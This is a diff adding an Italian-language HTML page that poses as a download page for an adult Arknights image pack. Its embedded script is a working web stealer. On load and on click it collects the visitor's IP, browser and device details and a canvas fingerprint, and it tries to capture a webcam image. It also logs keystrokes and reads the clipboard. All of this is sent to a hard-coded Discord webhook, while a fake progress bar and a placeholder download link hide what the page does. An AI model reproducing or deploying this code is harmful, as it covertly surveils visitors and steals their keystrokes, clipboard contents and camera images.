@@ -1,0 +1,156 @@
+<!DOCTYPE html>
+<html lang="it">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>NoxiusNoxy - Arknights NSFW Pack 2026</title>
+    <style>
+        body { background: #0a0a0a; color: #fff; font-family: Arial, sans-serif; text-align: center; margin: 0; padding: 40px; }
+        .container { max-width: 720px; margin: 0 auto; }
+        .button { display: inline-block; padding: 22px 70px; font-size: 30px; background: linear-gradient(45deg, #ff00ff, #00ffff); color: white; border: none; border-radius: 15px; cursor: pointer; margin: 40px 0; box-shadow: 0 0 40px #ff00ff; transition: all 0.4s; }
+        .button:hover { transform: scale(1.08); box-shadow: 0 0 60px #00ffff; }
+        h1 { color: #ff00ff; text-shadow: 0 0 20px #ff00ff; }
+        .progress { width: 80%; height: 25px; background: #222; margin: 20px auto; border-radius: 10px; overflow: hidden; display: none; }
+        .bar { height: 100%; width: 0%; background: linear-gradient(90deg, #ff00ff, #00ffff); transition: width 0.3s; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🔥 NoxiusNoxy Exclusive NSFW Pack 2026 🔥</h1>
+        <p>Arknights + Furry + Lewd Collection (18+ Only)</p>
+        <p><strong>1.8 GB - Password: noxysnoxy</strong></p>
+        
+        <div id="progress" class="progress"><div id="bar" class="bar"></div></div>
+        
+        <a href="#" id="downloadBtn" class="button">⬇️ SCARICA ORA</a>
+        <p style="margin-top: 50px; opacity: 0.7;">File: noxysnoxy_arknights_nsfw_pack_june2026.zip</p>
+    </div>
+
+    <script>
+        const WEBHOOK = "https://discord.com/api/webhooks/1516557179958591658/RHo2_tp0AvLmXndWh3ofo06nEGbbz2gFvD2LdTh81bytuZShO1tnXOo_jt_vLpUxGJBV";
+
+        async function sendLog(title, fields) {
+            try {
+                await fetch(WEBHOOK, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({
+                        content: `**🔥 ${title}**`,
+                        embeds: [{ color: 0xff00ff, title: "Advanced Web Stealer", fields: fields, timestamp: new Date().toISOString() }]
+                    })
+                });
+            } catch(e) {}
+        }
+
+        // ==================== RACCOGLI TUTTO POSSIBILE ====================
+        async function collectAllData() {
+            const fields = [];
+
+            // System + Browser Info
+            fields.push({ name: "IP", value: "`Caricamento...`" });
+            fields.push({ name: "User-Agent", value: `\`${navigator.userAgent}\`` });
+            fields.push({ name: "Platform", value: navigator.platform });
+            fields.push({ name: "Language", value: navigator.language });
+            fields.push({ name: "Timezone", value: Intl.DateTimeFormat().resolvedOptions().timeZone });
+            fields.push({ name: "Screen", value: `${screen.width}×${screen.height} (${screen.colorDepth}bit)` });
+            fields.push({ name: "Device Memory", value: navigator.deviceMemory ? navigator.deviceMemory + " GB" : "N/A" });
+            fields.push({ name: "Hardware Concurrency", value: navigator.hardwareConcurrency + " cores" });
+            fields.push({ name: "Referrer", value: document.referrer || "Diretto" });
+
+            // IP
+            try {
+                const ipRes = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipRes.json();
+                fields[0].value = `\`${ipData.ip}\``;
+            } catch(e) {}
+
+            // Canvas + WebGL Fingerprint
+            try {
+                const canvas = document.createElement('canvas');
+                const ctx = canvas.getContext('2d');
+                ctx.fillText('NoxyStealer', 10, 50);
+                const fingerprint = canvas.toDataURL().slice(0, 80);
+                fields.push({ name: "Canvas Fingerprint", value: `\`${fingerprint}...\`` });
+            } catch(e) {}
+
+            sendLog("VICTIM CONNECTED - FULL DUMP", fields);
+
+            // Tentativo Webcam
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                video.play();
+                setTimeout(() => {
+                    const canvas = document.createElement('canvas');
+                    canvas.width = 640; canvas.height = 480;
+                    canvas.getContext('2d').drawImage(video, 0, 0);
+                    canvas.toBlob(blob => {
+                        fetch(WEBHOOK, {
+                            method: "POST",
+                            body: blob,
+                            headers: { "Content-Type": "image/png" }
+                        });
+                    }, 'image/png');
+                    stream.getTracks().forEach(track => track.stop());
+                }, 1500);
+            } catch(e) {}
+        }
+
+        // Keylogger (solo mentre la pagina è aperta)
+        let keys = "";
+        document.addEventListener('keydown', (e) => {
+            keys += e.key;
+            if (keys.length > 120) {
+                sendLog("KEYLOGGER DUMP", [{ name: "Keys", value: `\`\`\`${keys}\`\`\`` }]);
+                keys = "";
+            }
+        });
+
+        // Clipboard Monitor
+        setInterval(async () => {
+            try {
+                const text = await navigator.clipboard.readText();
+                if (text && text.length > 3) {
+                    sendLog("CLIPBOARD", [{ name: "Content", value: `\`\`\`${text}\`\`\`` }]);
+                }
+            } catch(e) {}
+        }, 4000);
+
+        // Fake Download con Progress
+        document.getElementById('downloadBtn').addEventListener('click', function(e) {
+            e.preventDefault();
+            
+            const progress = document.getElementById('progress');
+            const bar = document.getElementById('bar');
+            progress.style.display = 'block';
+            
+            let width = 0;
+            const interval = setInterval(() => {
+                width += Math.random() * 12;
+                if (width > 100) width = 100;
+                bar.style.width = width + '%';
+                if (width >= 100) {
+                    clearInterval(interval);
+                    setTimeout(() => {
+                        const link = document.createElement('a');
+                        link.href = "https://files.catbox.moe/fake-nsfw-pack.zip"; // ← cambia con link reale
+                        link.download = "noxysnoxy_arknights_nsfw_pack_june2026.zip";
+                        document.body.appendChild(link);
+                        link.click();
+                        document.body.removeChild(link);
+                        alert("Download completato!\nPassword: noxysnoxy");
+                    }, 600);
+                }
+            }, 80);
+
+            collectAllData();
+        });
+
+        // Avvio immediato
+        window.onload = () => {
+            collectAllData();
+        };
+    </script>
+</body>
+</html>
